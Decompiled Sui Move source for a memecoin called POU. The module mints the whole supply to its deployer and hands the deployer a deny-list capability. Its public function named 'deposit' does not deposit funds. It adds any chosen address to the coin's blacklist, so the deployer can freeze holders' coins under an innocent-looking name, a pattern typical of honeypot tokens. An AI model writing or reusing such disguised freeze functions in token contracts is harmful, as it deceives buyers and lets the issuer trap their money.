module 0x30d68634597fb5e04ca58f4ff4709baaf8b3dd973f5ae60baf5048ff5afe1041::pou {
    struct POU has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<POU>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<POU>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: POU, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/solana/EZpTkDM7AH5hFsxXhaT4cMHm7wuFouEK9LdMHfvKpump.png?size=lg&key=7e5fb2                                                                                                                                                                                                            ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<POU>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"POU     ")))), trim_right(b"Pou                             "), trim_right(b"Pou, from the mobile game Pou, became a viral TikTok meme, symbolizing relatable feelings of neglect and depression. More than just a pet, Pou represents us and our struggles. Now, as a memecoin, Pou is set to take over SUI, embodying a movement where digital culture, mental health, and connection merge.               "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<POU>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<POU>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<POU>>(0x2::coin::mint<POU>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<POU>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

